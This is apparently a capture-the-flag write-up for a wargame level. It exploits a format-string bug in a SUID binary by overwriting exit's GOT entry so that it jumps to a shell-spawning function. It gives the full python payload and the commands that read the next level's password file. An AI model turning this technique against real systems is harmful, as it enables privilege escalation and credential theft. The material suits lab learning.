# level5

## 1. Connect to the VM

The password for `level5`, obtained by solving `level4`, is:

```text
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

Connect with:

```bash
ssh level5@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.c`.

The binary is owned by `level6` and has the SUID bit set. It therefore runs
with `level6` privileges.

The important functions are:

```c
void o(void)
{
	system("/bin/sh");
	_exit(1);
}

void n(void)
{
	char buffer[520];

	fgets(buffer, 512, stdin);
	printf(buffer);
	exit(1);
}
```

The `o` function starts a shell, but it is never called normally. The user
controls `buffer`, which is passed directly to `printf` as the format string.
This creates a format-string vulnerability.

The objective is to redirect the call to `exit` at the end of `n` toward the
function `o`.

## 3. Find the addresses

Disassemble the binary:

```bash
objdump -d -M intel level5
```

The `o` function starts at:

```text
o address = 0x080484a4
```

Find the relocation entry used by `exit`:

```bash
objdump -R level5
```

The output contains:

```text
08049838 R_386_JUMP_SLOT   exit
```

The Procedure Linkage Table uses this Global Offset Table entry to find the
real address of `exit`. If the value stored at `0x08049838` is replaced with
the address of `o`, the call to `exit(1)` executes `o()` instead.

On a little-endian x86 machine, the GOT address must be written as:

```text
\x38\x98\x04\x08
```

## 4. Find the format-string index

Place `BBBB` at the beginning of the input and display several stack values:

```bash
echo 'BBBB %x %x %x %x' | ./level5
```

The fourth value printed is:

```text
42424242
```

`0x42` is the ASCII value of `B`, so the fourth value read by `printf`
contains the first four bytes of our input.

We can therefore use the first four bytes as a destination address with:

```text
%4$n
```

## 5. Overwrite the GOT entry

The `%n` format writes the number of characters already printed into the
address supplied to it.

The address of `o` in decimal is:

```text
0x080484a4 = 134513828
```

The four raw address bytes at the beginning of the payload are already
counted by `printf`. The required padding is therefore:

```text
134513828 - 4 = 134513824
```

The payload is:

```text
[exit GOT address][print 134513824 characters][%4$n]
```

It writes `0x080484a4` into the GOT entry of `exit`.

## 6. Exploit the binary

Run:

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; cat) | ./level5
```

The large padding makes the command produce a considerable amount of output.
After `printf` returns, `n` calls `exit`, whose GOT entry now points to `o`.
The program consequently starts `/bin/sh`.

Verify the effective user and read the next password:

```bash
id
cat /home/user/level6/.pass
```

The same operation can be performed non-interactively:

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; \
  echo 'cat /home/user/level6/.pass') | ./level5
```

This prints the password stored in `flag`.
